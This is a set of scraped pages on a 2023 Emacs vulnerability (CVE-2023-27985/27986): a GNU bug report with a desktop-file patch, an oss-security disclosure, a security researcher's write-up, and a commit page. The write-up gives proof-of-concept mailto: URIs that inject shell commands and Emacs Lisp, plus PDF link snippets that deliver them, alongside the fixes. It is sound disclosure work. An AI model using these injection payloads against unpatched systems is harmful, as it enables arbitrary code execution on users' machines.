=== Content from debbugs.gnu.org_13514f07_20250115_084542.html ===

# GNU bug report logs - #60204 28.2; Invalid Exec key in etc/emacsclient-mail.desktop

[Previous](bugreport.cgi?bug=60203) [Next](bugreport.cgi?bug=60205)

Package:
[emacs](pkgreport.cgi?package=emacs);

Reported by: [Ulrich Müller <ulm <at> gentoo.org>](pkgreport.cgi?submitter=ulm%40gentoo.org)

Date: Mon, 19 Dec 2022 16:15:02 UTC

Severity: normal

Found in version 28.2

**Done:** Eli Zaretskii <eliz <at> gnu.org>

Bug is archived. No further changes may be made.

To add a comment to this bug, you must first [unarchive](/server-control.html) it, by sending

a message to control AT debbugs.gnu.org, with *unarchive 60204* in the body.

You can then email your comments to 60204 AT debbugs.gnu.org in the normal way.

Toggle the display of automated, internal messages from the tracker.

View this report as an [mbox folder](bugreport.cgi?mbox=yes;bug=60204 "Folder with messages as they arrived at the tracker"), [status mbox](bugreport.cgi?mboxstat=yes;bug=60204 "Folder with a status summary message at the start"), [maintainer mbox](bugreport.cgi?mboxmaint=yes;bug=60204;mbox=yes "Folder of messages as sent from the tracker to the maintainers")

---

**Report forwarded**
to `bug-gnu-emacs <at> gnu.org`:

`bug#60204`; Package `emacs`.
(Mon, 19 Dec 2022 16:15:02 GMT) [Full text](bugreport.cgi?bug=60204;msg=2) and [rfc822 format](bugreport.cgi?bug=60204;msg=2;mbox=yes) available.

---

**Acknowledgement sent**
to `Ulrich Müller <ulm <at> gentoo.org>`:

New bug report received and forwarded. Copy sent to `bug-gnu-emacs <at> gnu.org`.
(Mon, 19 Dec 2022 16:15:02 GMT) [Full text](bugreport.cgi?bug=60204;msg=4) and [rfc822 format](bugreport.cgi?mbox=yes;msg=4;bug=60204) available.

---

[Message #5](#5) received at submit <at> debbugs.gnu.org ([full text](bugreport.cgi?bug=60204;msg=5), [mbox](bugreport.cgi?bug=60204;msg=5;mbox=yes)):

```

From: Ulrich Müller <ulm <at> gentoo.org>
To: bug-gnu-emacs <at> gnu.org
Subject: 28.2; Invalid Exec key in etc/emacsclient-mail.desktop
Date: Mon, 19 Dec 2022 17:14:09 +0100

```
```
Apparently the emacsclient-mail.desktop file doesn't conform to the
Desktop Entry Specification at
<https://specifications.freedesktop.org/desktop-entry-spec/desktop-entry-spec-latest.html#exec-variables>
which says about the Exec key:

| Field codes must not be used inside a quoted argument, the result of
| field code expansion inside a quoted argument is undefined.

However, the %u field code is used inside a quoted argument of the
Exec key in both the [Desktop Entry] and [Desktop Action new-window]
sections.

See patch included below.

From 1ee6903cccde01c36dd58951102252abadada994 Mon Sep 17 00:00:00 2001
From: =?UTF-8?q?Ulrich=20M=C3=BCller?= <ulm <at> gentoo.org>
Date: Mon, 19 Dec 2022 16:51:20 +0100
Subject: [PATCH] Fix quoted argument in emacsclient-mail.desktop Exec key

* etc/emacsclient-mail.desktop (Exec): The Desktop Entry
Specification does not allow field codes like %u inside a quoted
argument. Work around it by passing %u as first parameter ($1)
to the shell wrapper.
* etc/emacsclient.desktop (Exec): Use `sh` rather than `placeholder`
as the command name of the shell wrapper.
---
 etc/emacsclient-mail.desktop | 4 ++--
 etc/emacsclient.desktop      | 2 +-
 2 files changed, 3 insertions(+), 3 deletions(-)

diff --git a/etc/emacsclient-mail.desktop b/etc/emacsclient-mail.desktop
index b575a41758a..91df122c594 100644
--- a/etc/emacsclient-mail.desktop
+++ b/etc/emacsclient-mail.desktop
@@ -1,7 +1,7 @@
 [Desktop Entry]
 Categories=Network;Email;
 Comment=GNU Emacs is an extensible, customizable text editor - and more
-Exec=sh -c "exec emacsclient --alternate-editor= --display=\\"\\$DISPLAY\\" --eval \\\\(message-mailto\\\\ \\\\\\"%u\\\\\\"\\\\)"
+Exec=sh -c "exec emacsclient --alternate-editor= --display=\\"\\$DISPLAY\\" --eval \\"(message-mailto \\\\\\"\\$1\\\\\\")\\"" sh %u
 Icon=emacs
 Name=Emacs (Mail, Client)
 MimeType=x-scheme-handler/mailto;
@@ -13,7 +13,7 @@ Actions=new-window;new-instance;

 [Desktop Action new-window]
 Name=New Window
-Exec=emacsclient --alternate-editor= --create-frame --eval "(message-mailto \\"%u\\")"
+Exec=sh -c "exec emacsclient --alternate-editor= --create-frame --eval \\"(message-mailto \\\\\\"\\$1\\\\\\")\\"" sh %u

 [Desktop Action new-instance]
 Name=New Instance
diff --git a/etc/emacsclient.desktop b/etc/emacsclient.desktop
index 1ecdecffafd..a9f840c7033 100644
--- a/etc/emacsclient.desktop
+++ b/etc/emacsclient.desktop
@@ -3,7 +3,7 @@ Name=Emacs (Client)
 GenericName=Text Editor
 Comment=Edit text
 MimeType=text/english;text/plain;text/x-makefile;text/x-c++hdr;text/x-c++src;text/x-chdr;text/x-csrc;text/x-java;text/x-moc;text/x-pascal;text/x-tcl;text/x-tex;application/x-shellscript;text/x-c;text/x-c++;
-Exec=sh -c "if [ -n \\"\\$*\\" ]; then exec emacsclient --alternate-editor= --display=\\"\\$DISPLAY\\" \\"\\$@\\"; else exec emacsclient --alternate-editor= --create-frame; fi" placeholder %F
+Exec=sh -c "if [ -n \\"\\$*\\" ]; then exec emacsclient --alternate-editor= --display=\\"\\$DISPLAY\\" \\"\\$@\\"; else exec emacsclient --alternate-editor= --create-frame; fi" sh %F
 Icon=emacs
 Type=Application
 Terminal=false
--
2.39.0

```

---

**Reply sent**
to `Eli Zaretskii <eliz <at> gnu.org>`:

You have taken responsibility.
(Sat, 24 Dec 2022 07:22:01 GMT) [Full text](bugreport.cgi?bug=60204;msg=7) and [rfc822 format](bugreport.cgi?bug=60204;msg=7;mbox=yes) available.

---

**Notification sent**
to `Ulrich Müller <ulm <at> gentoo.org>`:

bug acknowledged by developer.
(Sat, 24 Dec 2022 07:22:02 GMT) [Full text](bugreport.cgi?bug=60204;msg=9) and [rfc822 format](bugreport.cgi?mbox=yes;bug=60204;msg=9) available.

---

[Message #10](#10) received at 60204-done <at> debbugs.gnu.org ([full text](bugreport.cgi?msg=10;bug=60204), [mbox](bugreport.cgi?bug=60204;msg=10;mbox=yes)):

```

From: Eli Zaretskii <eliz <at> gnu.org>
To: Ulrich Müller <ulm <at> gentoo.org>
Cc: 60204-done <at> debbugs.gnu.org
Subject: Re: bug#60204: 28.2; Invalid Exec key in etc/emacsclient-mail.desktop
Date: Sat, 24 Dec 2022 09:21:04 +0200

```
```
> From: Ulrich Müller <ulm <at> gentoo.org>
> Date: Mon, 19 Dec 2022 17:14:09 +0100
>
> Apparently the emacsclient-mail.desktop file doesn't conform to the
> Desktop Entry Specification at
> <https://specifications.freedesktop.org/desktop-entry-spec/desktop-entry-spec-latest.html#exec-variables>
> which says about the Exec key:
>
> | Field codes must not be used inside a quoted argument, the result of
> | field code expansion inside a quoted argument is undefined.
>
> However, the %u field code is used inside a quoted argument of the
> Exec key in both the [Desktop Entry] and [Desktop Action new-window]
> sections.
>
> See patch included below.

Thanks, I installed this on the emacs-29 branch, and I'm closing the
bug.

```

---

**bug archived.**
Request was from `Debbugs Internal Request <help-debbugs <at> gnu.org>`
to `internal_control <at> debbugs.gnu.org`.
(Sat, 21 Jan 2023 12:24:04 GMT) [Full text](bugreport.cgi?msg=12;bug=60204) and [rfc822 format](bugreport.cgi?mbox=yes;bug=60204;msg=12) available.

---

This bug report was last modified 1 year and 359 days ago.

---

[Previous](bugreport.cgi?bug=60203) [Next](bugreport.cgi?bug=60205)

---

[GNU bug tracking system](//debbugs.gnu.org/)

Copyright (C) 1999 Darren O. Benham,
1997,2003 nCipher Corporation Ltd,
1994-97 Ian Jackson.



=== Content from www.openwall.com_d2277649_20250115_084545.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](1) [[next>]](3) [[thread-next>]](../../../2023/03/09/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <80616781-a635-02a0-2aa3-a8afc60e6c4c@free.fr>
Date: Wed, 8 Mar 2023 12:37:29 +0100
From: Gabriel Corona <gabriel.corona@...e.fr>
To: oss-security@...ts.openwall.com
Subject: Shell command and Emacs Lisp code injection in
 emacsclient-mail.desktop

emacsclient-mail.desktop is vulnerable to shell command
injections and Emacs Lisp injections through a crafted
mailto: URI.

This has been introduced in Emacs 28.1:

<http://git.savannah.gnu.org/cgit/emacs.git/commit/?h=emacs-29&id=b1b05c828d67930bb3b897fe98e1992db42cf23c>

A fix for shell command injection is currently included
in the upcoming 28.3 branch:

<http://git.savannah.gnu.org/cgit/emacs.git/commit/?h=emacs-29&id=d32091199ae5de590a83f1542a01d75fba000467>

A fix for both is currently included in the upcoming 29.1 branch:

<http://git.savannah.gnu.org/cgit/emacs.git/commit/?h=emacs-29&id=3c1693d08b0a71d40a77e7b40c0ebc42dca2d2cc>

Download attachment "[OpenPGP_signature](2/1)" of type "application/pgp-signature" (841 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.gabriel.urdhr.fr_cb54c652_20250115_084544.html ===
  [/dev/posts/](/)

* [Home](/)
* [Tags](/tags/)
* [Archives](/archives/)
* [Vulnerabilities](/vulnerabilities/)
* [Code](https://github.com/randomstuff)
* Configuration
  [нет войне](https://github.com/RSF-RWB/collateralfreedom) [Слава Україні](https://stand-with-ukraine.pp.ua/)
# Shell command and Emacs Lisp injection in emacsclient-mail.desktop

Published: Jun 8 2023

Updated: Jun 8 2023

 Comment   Like   Dislike   Other reaction   Share

[computer](/tags/computer/) [security](/tags/security/) [emacs](/tags/emacs/) [shell](/tags/shell/) [unix](/tags/unix/) [freedesktop](/tags/freedesktop/)

[CVE-2023-27986](https://nvd.nist.gov/vuln/detail/CVE-2023-27986) [CVE-2023-27985](https://nvd.nist.gov/vuln/detail/CVE-2023-27985)

Shell command injection and Emacs Lisp injection vulnerabilities in one of the Emacs Desktop Entry (emacsclient-mail.desktop) leading to arbitrary code execution through a crafted `mailto:` URI.

One of the Emacs [Desktop Entry](https://specifications.freedesktop.org/desktop-entry-spec/desktop-entry-spec-latest.html) (`emacsclient-mail.desktop`) is vulnerable to [shell command injection](https://www.gabriel.urdhr.fr/videos/emacsclient-mail-shell-injection.ogv) and [Emacs Lisp injection](https://www.gabriel.urdhr.fr/videos/emacsclient-mail-lisp-injection.ogv) through a crafted `mailto:` URI. This can for example be exploited by a remote attacker through a hyperlink in a malicious PDF (as demonstrated using Evince and Okular). This can be used to **execute arbitrary code** on the user's behalf.

| Vulnerability | CVE | Affected | Fixed in |
| --- | --- | --- | --- |
| Shell command injection through emacsclient-mail.desktop | [CVE-2023-27985](https://nvd.nist.gov/vuln/detail/CVE-2023-27985) | 28.1 to 28.x | 29.0.90 |
| Emacs Lisp injection through emacsclient-mail.desktop | [CVE-2023-27986](https://nvd.nist.gov/vuln/detail/CVE-2023-27986) | 28.1 to 28.x | 29.0.90 |

## Shell command injection

The Desktop entry (`emacsclient-mail.desktop`) is as follows:

```
[Desktop Entry]
Categories=Network;Email;
Comment=GNU Emacs is an extensible, customizable text editor - and more
Exec=sh -c "exec emacsclient --alternate-editor= --display=\\"\\$DISPLAY\\" --eval \\\\(message-mailto\\\\ \\\\\\"%u\\\\\\"\\\\)"
Icon=emacs
Name=Emacs (Mail, Client)
MimeType=x-scheme-handler/mailto;
NoDisplay=true
Terminal=false
Type=Application
Keywords=emacsclient;
Actions=new-window;new-instance;

# ...

```

The `Exec` stanza is vulnerable to injection of shell commands and Emacs Lisp code.

The shell command injection may be demonstrated on KDE with the following command:

```
kde-open "mailto:foo@example.com:\$(xterm -e nyancat)"

```

This executes the following shell command:

```
exec emacsclient --alternate-editor= --display="$DISPLAY" --eval \(message-mailto\ \"mailto:foo@example.com:$(xterm -e nyancat)\"\)

```

which in turns executes:

```
xterm -e nyancat

```

This may for example be [triggered from Okular](https://www.gabriel.urdhr.fr/videos/emacsclient-mail-shell-injection.ogv) under KDE (i.e., through `kde-open`). Clicking on a malicious URI contained in a malicious PDF results in the execution of the embedded shell command:

```
XDG_CURRENT_DESKTOP=KDE KDE_SESSION_VERSION=4 okular test.pdf
XDG_CURRENT_DESKTOP=KDE KDE_SESSION_VERSION=4 xdg-open "mailto:foo@example.com:\$(xterm -e nyancat)"

```

With a PDF containing such a snippet:

```
4 0 obj
<</Type/Annot/Subtype/Link/Border[0 0 0]/Rect[56 772.4 77.3 785.1]/A<</Type/Action/S/URI/URI(mailto:foo@example.com:\$(xterm -e nyancat))>>
endobj

```

This has been introduced by [commit b1b05c82](http://git.savannah.gnu.org/cgit/emacs.git/commit/?h=emacs-29&id=b1b05c828d67930bb3b897fe98e1992db42cf23c). This has beed fixed in [commit d3209119](http://git.savannah.gnu.org/cgit/emacs.git/commit/?h=emacs-29&id=d32091199ae5de590a83f1542a01d75fba000467) as part of [Emacs Bug #60204](https://debbugs.gnu.org/cgi/bugreport.cgi?bug=60204) (though the security impact of this bug was not noticed at this point):

```
Exec=sh -c "exec emacsclient --alternate-editor= --display=\\"\\$DISPLAY\\" --eval \\"(message-mailto \\\\\\"\\$1\\\\\\")\\"" sh %u

```

This vulnerability has been observed with:

* Debian Testing;
* GNU Emacs 28.2;
* xdg-utils (xdg-ooen) 1.1.3-4.1;
* KDE Plasma Desktop (5.27.0-1);
* Okular 22.12.1
* `kde-open` 4:5.27.0-1

## Emacs Lisp injection

This patch fixes the shell command injection. However, it is still vulnerable to Emacs Lisp injection resulting to arbitrary code execution.

The new `Exec` stanza in the desktop entry is:

```
Exec=sh -c "exec emacsclient --alternate-editor= --display=\\"\\$DISPLAY\\" --eval \\"(message-mailto \\\\\\"\\$1\\\\\\")\\"" sh %u

```

Any of these commands demonstrate Emacs Lisp injection and trigger the execution of an external program:

```
gio open 'mailto:foo@example.com"(shell-command-to-string"xterm -e nyancat")"'
XDG_CURRENT_DESKTOP=GNOME3 xdg-open 'mailto:foo@example.com"(shell-command-to-string"xterm -e nyancat")")'

```

This executes the following shell command:

```
sh -c "exec emacsclient --alternate-editor= --display=\"$DISPLAY\" --eval \"(message-mailto \\\"$1\\\")\"" \
  sh 'mailto:foo@example.com"(shell-command-to-string"xterm -e nyancat")"'

```

This executes the following Lisp code:

```
(message-mailto "mailto:foo@example.com"(shell-command-to-string"xterm -e nyancat")"")

```

which triggers a shell command:

```
xterm -e nyancat

```

Note: evaluation of the inner code

For some reason on some installations, the inner code (`shell-command-to-string`) is not evaluated apparently because the number of arguments for `message-mailto`  is not correct: `(wrong-number-of-arguments message-mailto 3)`.

While this works:

```
(message-mailto (shell-command-to-string"xterm -e nyancat"))

```

This does not work:

```
(message-mailto "mailto:foo@example.com" (shell-command-to-string"xterm -e nyancat"))

```

I don't know why this happens.

This can be [triggered from Evince](https://www.gabriel.urdhr.fr/videos/emacsclient-mail-lisp-injection.ogv) under GNOME (i.e. through `gio open`):

```
XDG_CURRENT_DESKTOP=GNOME3 evince test.pdf

```

With a PDF containing such a snippet:

```
4 0 obj
<</Type/Annot/Subtype/Link/Border[0 0 0]/Rect[56 772.4 77.3 785.1]/A<</Type/Action/S/URI/URI(mailto:foo@example.com"(shell-command-to-string"xterm -e nyancat")")>>
>>
endobj

```

This is fixed in [commit 3c1693d08b0a71d40a77e7b40c0ebc42dca2d2cc](http://git.savannah.gnu.org/cgit/emacs.git/commit/?h=emacs-29&id=3c1693d08b0a71d40a77e7b40c0ebc42dca2d2cc):

```
# We want to pass the following commands to the shell wrapper:
# u=${1//\\/\\\\}; u=${u//\"/\\\"}; exec emacsclient --alternate-editor= --display="$DISPLAY" --eval "(message-mailto \"$u\")"
# Special chars '"', '$', and '\' must be escaped as '\\"', '\\$', and '\\\\'.
Exec=bash -c "u=\\${1//\\\\\\\\/\\\\\\\\\\\\\\\\}; u=\\${u//\\\\\\"/\\\\\\\\\\\\\\"}; exec emacsclient --alternate-editor= --display=\\"\\$DISPLAY\\" --eval \\"(message-mailto \\\\\\"\\$u\\\\\\")\\"" bash %u

```

This fix was later modified in [commit c8ec0017](http://git.savannah.gnu.org/cgit/emacs.git/commit/?h=emacs-29&id=c8ec0017cb96d4ac98be21e1fe9a95e1aa723e99) in order to [avoid depending on bash](https://lists.gnu.org/archive/html/emacs-devel/2023-03/msg00227.html):

```
Exec=sh -c "u=\\$(echo \\"\\$1\\" | sed 's/[\\\\\\"]/\\\\\\\\&/g'); exec emacsclient --alternate-editor= --display=\\"\\$DISPLAY\\" --eval \\"(message-mailto \\\\\\"\\$u\\\\\\")\\"" sh %u

```

This vulnerability has been observed with:

* Debian Testing;
* GNU Emacs 28.2;
* xdg-utils (xdg-open) 1.1.3-4.1;
* GNOME 4.0-1;
* Evince 43.1-2+b1
* `gio open` 2.74.5-1

## Conclusion

It is interesting that in this case, the vulnerablity was introduced by the Desktop Entry file. The security impact of such files may easily be overlooked.

## Timeline

* 2023-03-02, Reported to maintainers
* 2023-03-02, Confirmation by maintainers
* 2023-03-07/08, Development of mitigations
* 2023-03-08, Disclosure
* 2023-03-08, CVEs assigned by MITRE
* 2023-04-10, Emacs 29.0.90 pretest is available containing the fix

## References

* [Emacs Bug #60204 ~ Invalid Exec key in etc/emacsclient-mail.desktop](https://debbugs.gnu.org/cgi/bugreport.cgi?bug=60204)
* [CVE-2023-27985](https://nvd.nist.gov/vuln/detail/CVE-2023-27985)
* [CVE-2023-27986](https://nvd.nist.gov/vuln/detail/CVE-2023-27986)
* [emacs-devel mailing-list thread about this](https://lists.gnu.org/archive/html/emacs-devel/2023-03/threads.html#00227)

## Appendix, some notes about file and URI handlers

You can modify the default Desktop entry used for a given URI scheme (or MIME type) by editing `~/.config/mimeapps.list`.

The following commands may be used to invoke programs to handle files and/or URIs:

* `xdg-open` is script which delegates to several of the other programs mentionned here depending on the desktop environment,
* `kde-open` and `kde-open5` are used under KDE;
* `kfmclient exec` is used under old versions of KDE;
* `dde-open` is used under [Deepin](https://www.deepin.org/);
* `enlightenment_open` is used under Enlightenment;
* `gio open` is used under GNOME;
* `gvfs-open` is used under GNOME as well;
* `gnome-open` is used under GNOME as well;
* `exo-open` is used under XFCE;
* `mimeopen` is a Perl utility;
* `dex` is a utility for Desktop entries.
       Search on this site   Search

 [About](/about/) - [Mentions légales](/legal/)



=== Content from git.savannah.gnu.org_9025b655_20250115_084540.html ===


| [cgit logo](/cgit/) | [index](/cgit/) : [emacs.git](/cgit/emacs.git/ "emacs.git") | bugfix/shorthand-fixes comment-cache concurrency-libtask dima\_regex\_embedded\_modifiers elparized-core emacs-23 emacs-24 emacs-25 emacs-26 emacs-27 emacs-28 emacs-29 emacs-30 feature/android feature/asan-gc-poisoning feature/auth-source-pass feature/breadcrumb-mode feature/byte-switch feature/byte-tail-recursion feature/byte-unwind-protect feature/cl-lib-improvements feature/comp-use-ctors feature/completion-lazy-hilit feature/completions-highlight-modifications feature/core-elpa-by-copy feature/deps-download feature/dll-only-windows feature/elpa-package feature/etags-update feature/etags\_update\_v2 feature/extend\_face\_id feature/external-completion feature/gnus-select feature/gnus-select2 feature/icomplete-vertical feature/inhibit-native-comp-cleanup feature/integrated-elpa feature/integration-of-dictionary-el feature/internal-msys feature/jit-improved-type-punning feature/jsonrpc-support-dap feature/libjit feature/mhtml-mode feature/minibuffer-completion-enhancements feature/more-fds feature/named-lambdas feature/new-tutorial feature/package+vc feature/package-autosuggest feature/parsable-ert-output feature/pgtk feature/positioned-lambdas feature/shorthand-namespacing feature/simple-16-theme feature/smaller-windows feature/soc-bytecode-in-traceback feature/soc-bytecode-in-traceback-reduced feature/stdout-stderr-stream feature/temacs-for-bootstrap feature/tramp-thread-safe feature/tree-sitter feature/type-hierarchy feature/windows-with-utils feature/xref-find-extra feature/zach-soc-bytecode-in-traceback feature/zach-soc-funcall-from-bytecode fix/bootstrap-build-minimize fix/bootstrap-build-minimize-squash fix/bug-2034 fix/bug-20871 fix/bug-35351 fix/bug-60974 fix/eieio-persistent fix/great-revert-bill fix/htmlfontify-21990 fix/not-defined-at-runtime girzel/gnus-headers gnus/nnatom master nick.lloyd-bytecode-jit old-branches/EMACS\_21\_1\_RC old-branches/EMACS\_22\_BASE old-branches/EMACS\_23\_1\_RC old-branches/NewVC-fileset old-branches/cairo old-branches/cedet-branch old-branches/concurrency old-branches/dynamic-modules-rc2 old-branches/emacs-unicode old-branches/emacs-unicode-2 old-branches/font-backend old-branches/gnus-5\_10-branch old-branches/lexbind old-branches/multi-tty old-branches/pending old-branches/profiler old-branches/python old-branches/rmail-mbox-branch old-branches/unicode-xft old-branches/window-pub other-branches/Boehm-GC other-branches/Boehm-versions other-branches/DAVELOVE other-branches/FLYSPELL other-branches/ILYA other-branches/VENDOR other-branches/fx-branch other-branches/gerd\_0001 other-branches/gerd\_dbe other-branches/old-bidi other-branches/old-concurrency other-branches/patches\_21\_0 other-branches/test2 other-branches/ttn-vms-21-2-stash other-branches/ttn-vms-21-3-stash pdumper scratch/a-modest-completion-redesign-proposal scratch/accurate-warning-pos scratch/add-jsonrpc scratch/add-lisp-data-mode scratch/albinus scratch/alloc scratch/allow-custom-load-paths-in-elisp-flymake scratch/allow-custom-null-and-false-objects-in-jsonc scratch/annotation-function-improvements scratch/api.el scratch/backend-completion scratch/benchmarks scratch/bug#48029 scratch/bug-42149-funny-pcm-completion-scores scratch/bug-50244 scratch/bug-50959-fix scratch/build-test scratch/bulk-tracing scratch/comp-branch-optim scratch/comp-static-data scratch/completion-api scratch/correct-warning-pos scratch/customize-quotes scratch/dbusbind-type scratch/dbusbind-type-tests scratch/eldoc-async scratch/eldoc-display-functions scratch/eldoc-eglot-rework scratch/eldoc-xref-project-gnu-elpa-core-packages scratch/electric-pair-cleanup-and-49518-bugfix scratch/elisp-benchmarks scratch/emacs-30-ts-query-patch scratch/emacs-editorconfig scratch/erc-oldies scratch/etags-regen scratch/eudc-bbdb-3 scratch/fcr scratch/fido-mode scratch/fix-40529-tabulated-list-mode-bootstrapping scratch/fix-snapshot-building scratch/flymake-augment-api scratch/flymake-fancy-end-of-line scratch/flymake-refactor-cleaner-for-emacs-26 scratch/follow scratch/font\_lock\_large\_files scratch/fontify-open-string scratch/func-type-decls scratch/gl-state-bytepos scratch/gnus-decoded scratch/gnus-docs scratch/gnus-hashtables scratch/gnus-roadmap scratch/gnus-search scratch/handler-bind-2 scratch/hard-narrow scratch/highlight-n-windows scratch/icomplete-lazy-highlight-attempt-2 scratch/icomplete-lazy-highlight-no-string-props scratch/icomplete-vertical-mode-gregory-and-joao scratch/icomplete-vertical-mode-improvements scratch/icons scratch/igc scratch/interpreted-function scratch/isearch-show-toggles scratch/joaot/make-completion-at-point-function scratch/kqueue scratch/last-cedet-merge scratch/lexspaces scratch/markers-as-gap-array scratch/merge-cedet-tests scratch/modern-mode scratch/multi-level-test-makefile scratch/native-timers-blocked scratch/new-flex-completion-style scratch/no-ls-lisp-advice scratch/no-purespace scratch/nonspecial-handlers scratch/np/backports-26.2 scratch/ns/emacs27-drawing scratch/octave-eldoc-fixes scratch/package-security scratch/pkg scratch/posix-spawn scratch/pure-overflow-warn scratch/python-eldoc-async scratch/raeburn-startup scratch/resolve-cc-mode-and-e-p-m scratch/reworked-icomplete-in-buffer-mode scratch/seccomp scratch/shorthand-namespacing scratch/some-more-icomplete-hacks scratch/support-plists-in-jsonc scratch/support-plists-in-jsonc-autodetect scratch/tango-icons scratch/timsort scratch/tsdh-vc-list-files scratch/tty-child-frames scratch/tzz/auth-source-reveal-mode scratch/tzz/cicd scratch/tzz/gnus-cloud-aead scratch/tzz/import-pl scratch/tzz/prettify-text-mode scratch/windows-98 scratch/windows-branch-build-2 scratch/with-fetched-url scratch/write-eglot-manual-for-advanced-server-config stream test-concurrency wallet xwidget xwidget\_mvp |
| --- | --- | --- |
| Emacs source repository |  |

| [summary](/cgit/emacs.git/?h=emacs-29)[refs](/cgit/emacs.git/refs/?h=emacs-29&id=d32091199ae5de590a83f1542a01d75fba000467)[log](/cgit/emacs.git/log/?h=emacs-29)[tree](/cgit/emacs.git/tree/?h=emacs-29&id=d32091199ae5de590a83f1542a01d75fba000467)[commit](/cgit/emacs.git/commit/?h=emacs-29&id=d32091199ae5de590a83f1542a01d75fba000467)[diff](/cgit/emacs.git/diff/?h=emacs-29&id=d32091199ae5de590a83f1542a01d75fba000467) | log msg author committer range |
| --- | --- |

**diff options**

|  | |
| --- | --- |
| context: | 12345678910152025303540 |
| space: | includeignore |
| mode: | unifiedssdiffstat only |
|  |  |

| author | Ulrich Müller <ulm@gentoo.org> | 2022-12-19 16:51:20 +0100 |
| --- | --- | --- |
| committer | Eli Zaretskii <eliz@gnu.org> | 2022-12-24 09:19:40 +0200 |
| commit | [d32091199ae5de590a83f1542a01d75fba000467](/cgit/emacs.git/commit/?h=emacs-29&id=d32091199ae5de590a83f1542a01d75fba000467) ([patch](/cgit/emacs.git/patch/?id=d32091199ae5de590a83f1542a01d75fba000467)) | |
| tree | [36116fc8020e9b1bb28d062e946f346dc2a4e51b](/cgit/emacs.git/tree/?h=emacs-29&id=d32091199ae5de590a83f1542a01d75fba000467) | |
| parent | [286c48137f69fa96b80d197da90c69a42df604a3](/cgit/emacs.git/commit/?h=emacs-29&id=286c48137f69fa96b80d197da90c69a42df604a3) ([diff](/cgit/emacs.git/diff/?h=emacs-29&id=d32091199ae5de590a83f1542a01d75fba000467&id2=286c48137f69fa96b80d197da90c69a42df604a3)) | |
| download | [emacs-d32091199ae5de590a83f1542a01d75fba000467.tar.gz](/cgit/emacs.git/snapshot/emacs-d32091199ae5de590a83f1542a01d75fba000467.tar.gz) | |

Fix quoted argument in emacsclient-mail.desktop Exec keyApparently the emacsclient-mail.desktop file doesn't conform to the
Desktop Entry Specification at
https://specifications.freedesktop.org/desktop-entry-spec/desktop-entry-spec-latest.html#exec-variables
which says about the Exec key:
| Field codes must not be used inside a quoted argument, the result of
| field code expansion inside a quoted argument is undefined.
However, the %u field code is used inside a quoted argument of the
Exec key in both the [Desktop Entry] and [Desktop Action new-window]
sections.
\* etc/emacsclient-mail.desktop (Exec): The Desktop Entry
Specification does not allow field codes like %u inside a quoted
argument. Work around it by passing %u as first parameter ($1)
to the shell wrapper.
\* etc/emacsclient.desktop (Exec): Use `sh` rather than `placeholder`
as the command name of the shell wrapper. (Bug#60204)
[Diffstat](/cgit/emacs.git/diff/?h=emacs-29&id=d32091199ae5de590a83f1542a01d75fba000467)

| -rw-r--r-- | [etc/emacsclient-mail.desktop](/cgit/emacs.git/diff/etc/emacsclient-mail.desktop?h=emacs-29&id=d32091199ae5de590a83f1542a01d75fba000467) | 4 | |  |  |  | | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- |
| -rw-r--r-- | [etc/emacsclient.desktop](/cgit/emacs.git/diff/etc/emacsclient.desktop?h=emacs-29&id=d32091199ae5de590a83f1542a01d75fba000467) | 2 | |  |  |  | | --- | --- | --- | |

2 files changed, 3 insertions, 3 deletions

